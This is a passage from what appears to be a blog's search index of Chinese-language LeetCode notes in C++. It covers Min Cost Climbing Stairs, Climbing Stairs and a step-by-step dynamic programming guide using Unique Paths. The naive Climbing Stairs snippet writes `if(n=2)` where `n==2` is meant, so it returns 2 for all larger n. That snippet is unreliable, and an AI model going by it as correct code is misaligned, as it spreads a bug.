class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; cost)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        dp.<span class="built_in">resize</span>(n, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">helper</span>(cost, n<span class="number">-1</span>), <span class="built_in">helper</span>(cost, n<span class="number">-2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由於會有很多重複的步驟，因此在這裡會需要宣告一個額外的陣列 <code>dp</code> 來去記錄重算的路徑成本，我們將 <code>dp</code> 初始化為 -1，每次遞迴都會去檢查當前路徑成本是否已經記錄在 <code>dp[n]</code> 裡面，如果有就直接返回該值，如果已經到第一階或者第二階，那他們的最小成本就會是 <code>cost[0]</code> 或 <code>cost[1]</code>。在遞迴的每一層都會去將當前的成本跟先前的最小成本加總，最後回傳給 <code>minCostClimbingStairs</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/746/result.jpeg"></p><h2 id="對空間複雜度進行最佳化"><a href="#對空間複雜度進行最佳化" class="headerlink" title="對空間複雜度進行最佳化"></a>對空間複雜度進行最佳化</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; cost)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>; i&lt;n; i++)&#123;</span><br><span class="line">            cost[i] += <span class="built_in">min</span>(cost[i<span class="number">-1</span>], cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(cost[n<span class="number">-1</span>], cost[n<span class="number">-2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這個解法用到DP那篇的步驟三 Tabulation，直接在題目給的 <code>cost</code> 陣列進行操作，選出前一階或前兩階小的成本與當前成本相加，加到後面結束</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/746/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>不論哪種作法都是，$O(n)$，因為必定還是會走完階梯，因此複雜度為 $O(n)$ (<code>n</code> 為陣列 <code>cost</code>大小)</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(N)$</p><p>最佳化後會是 $O(1)$ 因為除了題目給的 <code>cost</code> 陣列之外沒有其他的空間需求。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬樓梯問題 | Easy | LeetCode#70. Climbing Stairs</title>
      <link href="/posts/355cc876.html"/>
      <url>/posts/355cc876.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/70/question.jpeg"></p><ul><li><p>題目難度：<code>Easy</code></p></li><li><p>題目敘述：題目描述要爬階梯，需要 <code>n</code> 階可以到頂端，每次可以跨一步或是兩步，有多少種爬到頂端的方式?</p></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先要先思考這題的遞迴關係，<strong>任意階的步驟數，會是由什麼組成？</strong></p><p>這裡可以觀察到如果 <code>n=1</code> 也就是往上一層有幾種走法，答案就是 <code>1</code> 因為只能走一步，那 <code>n=2</code> 這時就可以選擇走兩次一步 <code>[1,1]</code> 或者是一次走兩步 <code>[2]</code>，也就是有兩種選擇，那若 <code>n=3</code> 呢？ 往上三階其實就是往上一階和往上兩街的組合，因此他們對應的走法數量也會是 <code>n=1</code> 和 <code>n=2</code> 的加總</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n=1 | output1=1</span><br><span class="line">n=2 | output2=2</span><br><span class="line"></span><br><span class="line">n=3 = 2+1 | output= output1+ output2</span><br></pre></td></tr></table></figure><p>因此可以總結遞回式為 $F(n) &#x3D; F(n-1) + F(n-2)$，把它寫成程式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n=<span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">climbStairs</span>(n<span class="number">-1</span>)+ <span class="built_in">climbStairs</span>(n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但這樣不會是 Optimized 的，因此需要額外storage 來儲存重複計算的部分</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[n]!=<span class="number">0</span>) <span class="keyword">return</span> dp[n];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">2</span>) <span class="keyword">return</span> dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        dp[n]=<span class="built_in">helper</span>(n<span class="number">-1</span>)+ <span class="built_in">helper</span>(n<span class="number">-2</span>);</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        dp = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡將題目給的函數 <code>climbStairs</code> 分離出一個單獨的 <code>helper</code> 函數，並且初始化一個整數向量 <code>dp</code>，在 <code>climbStairs</code> 中將 <code>dp</code> 初始化為 0，而在 <code>helper</code> 函數中，讓 <code>dp</code> 儲存遞迴呼叫的結果，而每次遞迴呼叫都會檢查 <code>helper(n)</code> 的結果，是否存在於陣列 <code>dp[n]</code>中，如果有就直接回傳其值，如果沒有並且已經遞回到第一階那就回傳 <code>dp[1]=1</code> 第二階就是 <code>dp[2]=2</code>  之後就是回傳 <code>dp[n]</code></p><blockquote><p>這麼做主要是做到到我們 DP 文章中的步驟二：Recursion + Memoization</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/70/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>每次調用 <code>helper(n)</code> 時，如果 <code>dp[n]</code> 的值不為 0，則直接返回已計算的結果，避免重複計算。如果 <code>dp[n]</code> 尚未計算，則調用 <code>helper(n-1)</code> 和 <code>helper(n-2)</code> 來計算。<strong>每一個 <code>n</code> 值只會被計算一次，因為每次計算後，結果會被存入 <code>dp[n]</code> 中。</strong> 之後當再次需要用到這個 <code>n</code> 時，就直接使用已經存儲的結果，避免了重複的遞迴運算。因此，對於每一個 <code>n</code>，函數只會進行一次遞迴計算，總共進行 $O(n)$ 次計算。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>程式使用一個大小為 <code>n+2</code> 的 <code>dp</code> 陣列來儲存計算結果。因此，這部分的空間複雜度為 $O(n)$</li><li>最差情況下，遞迴的深度為 $n$，因此Recursive Call 使用的 Stack 深度為 $O(n)$<br>因此整體空間複雜度為 $O(n)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題知識整理 | 動態規劃 Dynamic Programming(DP)</title>
      <link href="/posts/dynamic_programming.html"/>
      <url>/posts/dynamic_programming.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>從還沒開始刷題前就耳聞了DP題目的恐怖，因此想說在實際開始刷類似題目前整理一下DP的知識。</p><blockquote><p>在閱讀網路資料的時候發現這篇文章解釋得很好，因此非常推薦先閱讀這篇 <a href="https://medium.com/@al.eks/the-ultimate-guide-to-dynamic-programming-65865ef7ec5b">文章</a>，作者有提到要理解 DP，<strong>耐心很重要，然後還需要熟悉遞迴，因為DP問題通常會用遞迴來解決</strong></p></blockquote><h1 id="甚麼是-Dynamic-Programming-DP"><a href="#甚麼是-Dynamic-Programming-DP" class="headerlink" title="甚麼是 Dynamic Programming(DP)?"></a>甚麼是 Dynamic Programming(DP)?</h1><p>這裡我必須提到上面那篇文章說的結論: <strong>Dynamic Programming 是一種用來幫助遞迴程式碼更加有效率的工具</strong>，所以文章作者也認為不該在面對一個問題的時候就先去識別這個問題是否是一個 DP問題，而是先判斷是否需要用到遞迴，而在遞迴的基礎上，會延伸思考到這個遞迴程式碼可能會很冗，因此有答案應該會有改善空間，<strong>而改善的方式就透過 Dynamic Programming</strong></p><blockquote><p>DP 是用來改善現有 Solution 的方式 !</p></blockquote><p>接下來介紹使用這個工具的步驟，其中包含了4個步驟，這裡會用一個題目來逐步解釋</p><p>題目:　<a href="https://leetcode.com/problems/unique-paths/description/">LeetCode62. Unique Paths</a></p><p><img src="/img/LeetCode/dp/robot_maze.png"></p><p>這題中給了一個大小 <em>m x n</em> 的格子，有一個機器人在最左上角的位置，機器人每次執行可以往下或往右走一格，機器人要試圖抵達最右下角的 Finish 格，要找出有多少種可能的獨特的路徑組合。</p><h2 id="步驟一-Recursion"><a href="#步驟一-Recursion" class="headerlink" title="步驟一: Recursion"></a>步驟一: Recursion</h2><p>這個步驟通常是最重要的一步會是制定整個解題計畫的關鍵!，需要做的事就是要回歸到最純粹的中心思想 - 遞迴，其實也就是相當於 <strong>先提出暴力解</strong></p><blockquote><p>同時這也能先說服面試官，你知道這題要使用怎樣的遞迴關係來解，也就是說要先找到遞迴關係，才有後面改善的空間</p></blockquote><p><img src="/img/LeetCode/dp/unipath.png"></p><p>首先這題要找的是最終有多少條路徑可以到終點，那會需要先知道甚麼? <strong>會需要知道從起點到任一格會有幾條路徑</strong>，我們從上面的圖看，可以知道從起點 <code>grid[0][0]</code> 到它右下角那格 <code>grid[1][1]</code> 可以從右邊走也可以從下面走 (題目規定只能右或往下移動) 一共是兩條路線，那從起點單獨往右以及單獨往下都各只有一條路線。</p><p>上面的例子應該也能看出，對於任意格 <code>[i][j]</code>，它的上一步可能是:</p><ul><li>從上面一格一移動下來，即 <code>[i-1][j]</code></li><li>從左邊一格一移動下來，即 <code>[i][j-1]</code></li></ul><p>而從上或從左移動一格都是在相同路徑上，因此數量不變，因此可以知道對於任意格 <code>[i][j]</code>，從起點到達它的路徑數量會是 <code>[i-1][j] + [i][j-1]</code></p><p><img src="/img/LeetCode/dp/unipath2.png"></p><p>在舉例一次也能驗證，若想移動到 <code>grid[2][2]</code>，所有的路徑數量勢必為 <code>grid[1][2] + grid[2][1]</code></p><p><img src="/img/LeetCode/dp/unipath3.png"></p><p>若我們將上面的想法寫成遞迴式如下，遞迴的終止條件會發生在執行到 <strong>起點的右邊一行或者是下面一列就停止</strong> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">1</span> || n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">uniquePaths</span>(m<span class="number">-1</span>,n) + <span class="built_in">uniquePaths</span>(m,n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>但實際跑下去會發現錯誤，Time Limit Exceeded ! 這就代表會有需要改善的地方，所以接下來第二步</p></blockquote><h2 id="步驟二-Recursion-Memoization"><a href="#步驟二-Recursion-Memoization" class="headerlink" title="步驟二: Recursion + Memoization"></a>步驟二: Recursion + Memoization</h2><p>這一步驟才真正開始使用 DP，但並不是所有沒有效率的問題都需要用 DP 解決，<strong>因此要先衡量這個問題值不值得用 DP 來解</strong>，根據步驟一的結果，<strong>若以下狀況存在並同時成立，才需要使用DP來解決</strong></p><ul><li>具有重疊的子問題 (Overlapping subproblems):  <em>你有多次解決相同的子問題</em> </li><li>具有最佳子結構 (An optimal substructure): <em>透過獲取每個子問題的最佳解，你可以得到整個問題的最佳解</em></li></ul><p>如果在面試或解題過程中發現這兩點沒辦法完全滿足，那就不該使用DP (或本篇介紹的方式)，可能可以用其他像是 backtracking 技巧來解。</p><blockquote><p>所以要怎麼確定，這題題目中有滿足這兩個條件呢?</p></blockquote><p>我下面畫了 Step1 的遞迴樹，可以發現其實並非所有子問題都重疊，但還是可以看到有很多重複計算，像是 <code>uniquePaths(2, 6)</code> 和 <code>uniquePaths(2, 5)</code>，所以還是可以看成是有重疊的子問題。</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step1 解法的遞迴樹</summary><div class="toggle-content"><p>可以放大來看</p><p><img src="/img/LeetCode/dp/unipath4.png"></p></div></details><p>第二個條件也可以被滿足，因為我們可以用 <code>[m-1][n]</code> 以及 <code>[m][n-1]</code> 來去得到 <code>[m][n]</code> 的最佳解</p><blockquote><p>所以這個步驟要達成的目標很簡單，<strong>那就是讓重複計算的部分只計算一次，並想辦法安全地保存起來(<em>memoization</em>)</strong></p></blockquote><p>儲存的目的是要讓後續重複計算的部分能夠方便查找，來降低計算量，因此在後續儲存中查找，<strong>也希望盡量達到 $O(1)$ 的複雜度</strong>，可以看情況用陣列或者是雜湊表。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[m][n])&#123;</span><br><span class="line">            <span class="keyword">return</span> dp[m][n];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(m==<span class="number">1</span> || n==<span class="number">1</span>) &#123;</span><br><span class="line">            dp[m][n]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> dp[m][n];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        dp[m][n] = <span class="built_in">helper</span>(m<span class="number">-1</span>,n) + <span class="built_in">helper</span>(m,n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>  <span class="built_in">helper</span>(m,n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面這是修正後的結果，主要透過一個2D Vector 來存放計算過的路徑數量，而由於要初始化陣列大小為 <em>m+1 x n+1</em> (這裡是怕存取超出邊界)，因此分成兩個函數進行操作。對於這題來說，需要改動的地方也不多，對於原先的邏輯只需要改動有兩處:</p><ul><li><strong>儲存遞迴呼叫結果</strong></li><li><strong>當一個遞迴呼叫已經存在於陣列中，則返回儲存值</strong> (i.e. <code>helper(m,n)</code> 的結果已經儲存在 <code>dp[m][n]</code> 當中)</li></ul><blockquote><p>這時再次執行，就會發現 Submit Accepted 了</p></blockquote><p>並且這樣執行的時間複雜度為 $O(M \times N)$，相比步驟一的做法為 $O(2^{M+N})$ (因為遞迴的每一層會將問題分解為兩個子問題) 提升更多效率，雖然時間複雜度降低了，但所使用的空間複雜度卻提升了，但這也說明了 <strong>DP 會是一種用空間換取時間的做法</strong>，這其實是非常值得的，<strong>因為這麼做的空間複雜度大多都是線性成長，但卻能夠指數型的改善時間複雜度</strong></p><blockquote><p>所以到目前為止的進度是，先能夠提出暴力解的遞迴做法後，接著透過額外的記憶體空間來去改善先前的做法! (面試的話到這一步已經很讚了)<br>那是否還有其他可以進一步最佳化的地方呢? 這就會到第三步</p></blockquote><h2 id="步驟三-Iteration-Tabulation"><a href="#步驟三-Iteration-Tabulation" class="headerlink" title="步驟三 : Iteration + Tabulation"></a>步驟三 : Iteration + Tabulation</h2><p>正常而言，如果在上一步中沒有明顯的效能提升 (或者面試官希望你進一步改善你的答案)，那就會需要第三步。這一步驟中使用 <em>Tabulation</em>，而非 <em>Memoization</em>，並且使透過 Iteration 而非 Recursion 的方式實作。</p><blockquote><p>但無論是 <em>Tabulation</em> 或者是 <em>Memoization</em> 他們的目標都一樣，<strong>就是要將先前計算結果儲存，在後續重複計算時取出使用</strong></p></blockquote><p>兩者的區別主要在於資料的儲存方式，<em>Tabulation</em> 主要是透過 <strong>陣列儲存 (通常是二微陣列)</strong> ，而 <em>Memoization</em> 則通常是用 Set, Hash Table 等方式儲存。 <strong>所以 <em>Tabulation</em> 會透過迭代的方式來走遍每個陣列，而 <em>Memoization</em> 則是藉助於遞迴呼叫。</strong></p><div class="note info flat"><p>這個變更不一定會讓時間或空間複雜度改善，但重點是， <strong>使用迭代陣列的方式可以容納更大的 Input Size，而不會受限於遞迴呼叫的 Call Stack 的最大上限</strong>  (Call Stack 太深還有機會 Stack Overflow)</p></div><p>所以回頭看原先 Unique Paths的題目，如果要用 Iterations，就可以透過迴圈反向迭代。</p><p><img src="/img/LeetCode/dp/unipath5.png"></p><p>可以看這張圖的右邊，原則上就是從右下角往左上角走，而作者在這裡選擇從倒數第二行和倒數第二列那格開始往回做的原因是，因為最下面那列和最右邊那行的可走路徑數量都會是 1，因此對於 <code>gird[1][5]</code> 從新的起點走到它會有的步驟數等於 <code>grid[2][5]</code> 和 <code>grid[1][6]</code>，因此可以得到一個關係式為 $F(m,n) &#x3D; F(m+1, n) + F(m, n+1)$。</p><p>重新改寫程式後會像是下面這樣:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// init a m x n 2D vector with value 1</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">1</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=m<span class="number">-2</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=n<span class="number">-2</span>; j&gt;=<span class="number">0</span>; j--)&#123;</span><br><span class="line">                <span class="comment">// do it backwardly</span></span><br><span class="line">                dp[i][j] = dp[i+<span class="number">1</span>][j] + dp[i][j+<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡詳細解釋程式碼的變更步驟:</p><ol><li>宣告一個大小 m x n 的2D Vector，其值為 1 (代表一整個網格，默認的路徑數量是 1)</li><li>建立迴圈，將倒數第二行以及到數第二列的格子 (<code>[m-2][n-2]</code>) 作為迴圈的起點，每次迭代都會將index 減去 1</li><li>走訪每個格子，並且規則就是我們剛剛得出的關係式</li><li>從右下角一路迭代回 <code>[0][0]</code>，一旦抵達 <code>[0][0]</code>，其儲存值就會是所有的路徑值</li></ol><p>如果把走訪過程視覺化就會像是下圖</p><p><img src="/img/LeetCode/dp/tab.png"></p><blockquote><p>執行結果和複雜度也跟步驟二一樣，並且也都是100% Runtime!<br>另外文章作者也提到這種做法很適合用在這種從A走到B 類型的題目，要做的事情就是填表格而已</p></blockquote><h2 id="步驟四-Iteration-Tabulation-Optimized"><a href="#步驟四-Iteration-Tabulation-Optimized" class="headerlink" title="步驟四: Iteration + Tabulation [Optimized]"></a>步驟四: Iteration + Tabulation [Optimized]</h2><blockquote><p>不一定每次都需要到此步驟，如果面試有到前三步驟，那就已經很好了</p></blockquote><p>本步驟的 <strong>目標在於降低空間複雜度</strong> ，經過前幾個步驟，時間複雜度應該已經是 Optimized了。之所以還有機會繼續最佳化空間複雜度，是因為儘管我們前面建立了 m x n 的網格來迭代儲存路徑數量， <strong>但實際上我們並不一定要一次持續存取整個表格。</strong></p><p>如果觀察到目前為止建立的遞迴關係 (可以觀察上面的走訪過程圖)，<strong>對任意格來說，所需要的格子只有它的正下方以及正右方的格子</strong>，因此在宣告陣列時僅需要 <code>m=2</code> 的 2 x n 陣列 (對於 Unique Paths 這題僅需這樣大小的空間就好)。 那這樣又要如何存放路徑值呢?</p><p>這裡的起點一樣會是 <code>[m-2][n-2]</code>，也就是步驟三的倒數第二列跟第二行的那格，可以想像成是擷取了原先 m x n 表格中的最下面兩列，並且一樣進行迭代，迭代規則就如同剛剛提到的，對於任意格來說只需要他的正下方以及正右方的格子，因此對於第一列 (<code>i=0</code>) 來說，規則會是 $F(m, n) &#x3D; F(m+1, n) + F(m,n+1) $，一旦第一列算完後，那用來計算第一列的第二列 (應該都會先是1) 就沒有利用價值了，這時候就將第一列的數值全部複製到第二列，用來計算新的第一列，跟著一樣的迭代規則走，最後的 $F(0, 0)$ 就會是整體路徑數量。</p><p><img src="/img/LeetCode/dp/tab2.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// init a m x n 2D vector with value 1</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(<span class="number">2</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">1</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=m<span class="number">-2</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=n<span class="number">-2</span>; j&gt;=<span class="number">0</span>; j--)&#123;</span><br><span class="line">                <span class="comment">// Handloe first row</span></span><br><span class="line">                <span class="comment">// (m+n) = (cell below) + (cell on the right)</span></span><br><span class="line">                dp[<span class="number">0</span>][j] = dp[<span class="number">1</span>][j] + dp[<span class="number">0</span>][j+<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Move to second row</span></span><br><span class="line">            dp[<span class="number">1</span>] = dp[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡可以比對步驟三以及步驟四之間空間複雜度的差異，步驟三因為要存放整張表格，因此空間複雜度會是 $O(n \times m)$，而步驟四僅存放 $2*n$ 個表格，因此空間複雜度會是$O(2 \times n) &#x3D; O(n)$。</p><p>這裡也可以從結果中觀察差異:</p><p><em>步驟三</em><br><img src="/img/LeetCode/dp/result1.png"></p><p><em>步驟四</em><br><img src="/img/LeetCode/dp/result2.jpeg"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://medium.com/@al.eks/the-ultimate-guide-to-dynamic-programming-65865ef7ec5b">https://medium.com/@al.eks/the-ultimate-guide-to-dynamic-programming-65865ef7ec5b</a><br><a href="https://shannonhung.github.io/posts/lecture-dp/">https://shannonhung.github.io/posts/lecture-dp/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重新排序鏈結 | Medium | LeetCode#143. Reorder List</title>
      <link href="/posts/94b01956.html"/>
      <url>/posts/94b01956.html</url>
      
